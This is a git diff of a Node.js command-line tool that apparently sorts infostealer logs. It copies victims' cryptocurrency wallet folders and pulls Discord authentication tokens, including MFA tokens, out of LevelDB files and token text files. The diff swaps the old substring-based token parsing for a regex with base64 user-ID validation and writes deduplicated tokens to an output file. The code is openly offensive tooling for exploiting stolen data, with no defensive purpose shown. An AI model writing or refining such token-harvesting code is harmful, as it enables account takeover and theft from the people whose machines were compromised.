@@ -3,12 +3,10 @@ const fs2 = require('fs-extra');
 const colors = require('colors');
 const glob = require('fast-glob');
 const prompts = require('prompts');
-
+const cliProgress = require('cli-progress');
 const langlist = require('./../lang.json');
 const check_folder = './logs';
 const results_folder = './results';
-let files = glob.sync(`./logs/**/Discord/**/*.l**`);
-let files2 = glob.sync(`./logs/**/Discord/*okens.txt`);
 let version = "0.5";
 
 let cryptofolders = ["Crypto Wallet", "Crypto Wallets", "Coins", "cryptocurrency", "Wallets", "coldwallets", "crypto"];
@@ -25,9 +23,10 @@ module.exports = {
         console.clear();
         console.log('');
         console.log(`${`  ██████████████████████████████████████████████████████ `.brightBlue} ${`v`.grey}${version.grey}`);
-        console.log(`${`  ██▀▄─██▄─█─▄█▄─▄▄─█─▄▄▄▄█─▄▄─█▄─▄▄▀█─▄─▄─█▄─▄▄─█▄─▄▄▀█ `.brightBlue} ${` reborn `.bgRed.white}`);
-        console.log(`${`  ██─▀─███▄▀▄███─▄█▀█▄▄▄▄─█─██─██─▄─▄███─████─▄█▀██─▄─▄█ `.brightBlue}`);
-        console.log(`${`  ▀▄▄▀▄▄▀▀▀▄▀▀▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▀▄▄▀▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▀▄▄▀ `.brightBlue}`);
+        console.log(`${`  ██▀▄ ██▄ █ ▄█▄ ▄▄ █ ▄▄▄▄█ ▄▄ █▄ ▄▄▀█ ▄ ▄ █▄ ▄▄ █▄ ▄▄▀█ `.brightBlue} ${` reborn `.bgRed.white}`);
+        console.log(`${`  ██ ▀ ███▄▀▄███ ▄█▀█▄▄▄▄ █ ██ ██ ▄ ▄███ ████ ▄█▀██ ▄ ▄█ `.brightBlue}`);
+        console.log(`${`  █▄▄█▄▄███▄███▄▄▄▄▄█▄▄▄▄▄█▄▄▄▄█▄▄█▄▄██▄▄▄██▄▄▄▄▄█▄▄█▄▄█ `.brightBlue}`);
+        console.log(`${`  ▀██▀██▀▀▀█▀▀▀█████▀█████▀████▀██▀██▀▀███▀▀█████▀██▀██▀`}`.brightBlue);
         console.log('');
     },
 
@@ -133,7 +132,7 @@ module.exports = {
                 for (line of data) {
                     let tempstring = line.split(`${check_folder}/`)[1];
                     let cryptoresult = tempstring.substring(0, tempstring.search('/'));
-                    await fs2.copy(`${line}/`, `results/Crypto/${cryptoresult}/`);
+                    await fs2.copy(`./${check_folder}/${cryptoresult}/`, `results/Crypto/${cryptoresult}/`);
                     console.log(` [Crypto]`, `${cryptoresult}`.cyan, langlist[lang][7].brightGreen);
                 }
             }
@@ -143,84 +142,49 @@ module.exports = {
 
     discord_ldb: function () {
         return new Promise(async (resolve, reject) => {
-        if (!files.length && !files2.length) {
-            console.log(` [Discord]`, `${langlist[lang][32] + langlist[lang][33]}`.brightRed);
-            resolve("Ok");
-        }
-        else {
-            
+            let files = glob.sync(`./logs/**/Discord/**/*.l**`);
+            let files2 = glob.sync(`./logs/**/Discord/*okens.txt`);
+            if (!files.length && !files2.length) {
+                console.log(` [Discord]`, `${langlist[lang][32] + langlist[lang][33]}`.brightRed);
+                resolve("Ok");
+            }
+            else {
                 for (let i = 0; i < files.length; i++) {
-                    let data = fs.readFileSync(files[i], 'utf-8');
-                    var tempdata = (data.indexOf('oken'));
-                    var res1 = data.indexOf('"', tempdata);
-                    var result_check = data.substr(res1 + 60, 1);
-                    if (result_check == '"') {
-                        var result = data.substr(res1 + 1, 59);
-                        var symbol_check = data.substr(res1 + 1, 1);
-                        if (symbol_check.match(/[A-Z^\d]/) !== null) {
-                            zxc.push(result);
-                        }
-                    }
-                    else {
-                        mfa_result_check = data.substr(res1 + 89, 1);
-                        if (mfa_result_check == '"') {
-                            var mfa_symbol_check = data.substr(res1 + 1, 3);
-                            if (mfa_symbol_check.match('mfa') !== null) {
-                                var mfa_result = data.substr(res1 + 1, 88);
-                                zxc.push(mfa_result);
+                    let data = await fs.readFileSync(files[i], 'utf-8');
+                    let regexp = /(mfa\.[\w_\-]{84})|([\w]{24}\.[\w_\-]{6}\.[\w_\-]{27})/g
+                    let strings = [...data.matchAll(regexp)];
+                    for (string of strings) {
+                        if (string != undefined) {  
+                            for (shit of string) {
+                                if (shit != undefined) {
+                                    let shitcheck = shit.match(/([A-z]|[0-9])*/);
+                                    if (shitcheck[0].includes("mfa") == false) {
+                                        let tocheck = Buffer.from(shitcheck[0], "base64").toString("utf-8");
+                                        if (tocheck.match(/^[0-9]+$/) != null) {
+                                            zxc.push(shit);
+                                        }
+                                    }
+                                }
                             }
                         }
                     }
                 }
-                for (let i = 0; i < files2.length; i++) {
-                    let data2 = fs.readFileSync(files2[i], 'utf-8');
-                    let temping = data2.toString().split('\n').toString().split('\r,');
-                    for (temping_sex of temping) {
-                        let symbol_check2 = temping_sex.substr(0, 1);
-                        if (symbol_check2.match(/([^a-z\s\d])/) !== null) {
-                            zxc.push(temping_sex);
-                        }
-
-                        else {
-                            let mfa_symbol_check2 = temping_sex.substr(0, 3);
-                            if (mfa_symbol_check2.match('mfa') !== null) {
-                                zxc.push(temping_sex);
-                            }
-                        }
-
-                        if (!files2.length) {
-                            if (!zxc.length) {
-                                console.log('');
-                                console.log(`$`.cyan, `${langlist[lang][18]}${check_folder}${langlist[lang][19]}`);
-                                console.log('');
-                                console.log('');
-                            }
-                        }
-
-                    }
-                }
-                
-        }
-        resolve("Ok");
+            }
+            resolve("Ok");
         });
     },
 
     tokens_filter: function () {
         return new Promise(async (resolve, reject) => {
-            var filtered_zxc = zxc.filter(function (el) {
-                return el != null;
-            });
+            if (!fs.existsSync(`${results_folder}/Discord`)) {
+                fs.mkdirSync(`${results_folder}/Discord`);
+                fs.appendFileSync(`${results_folder}/Discord/output_tokens.txt`, "");
+            }
 
-            uniq_zxc = filtered_zxc.filter(function (item, pos) {
-                return filtered_zxc.indexOf(item) == pos;
-            })
+            let uniq_zxc = new Set(zxc);
 
             for (writing_zxc of uniq_zxc) {
-                fs.appendFile(`${results_folder}/Discord/output_tokens.txt`, `${writing_zxc}\n`, function (err) {
-                    if (err) {
-                        return err;
-                    }
-                });
+                fs.appendFileSync(`${results_folder}/Discord/output_tokens.txt`, `${writing_zxc}\r\n`, 'utf-8');
                 console.log(` [Discord]`, `${writing_zxc}`.cyan, langlist[lang][7].brightGreen);
             }
             resolve("Ok");
@@ -282,7 +246,7 @@ module.exports = {
                     if (mainaction.text.includes(3)) {
                         await this.discord_ldb().then(async (res) => {
                             if (res == "Ok") {
-                                await this.tokens_filter()
+                                this.tokens_filter();
                             }
                         })
                     }
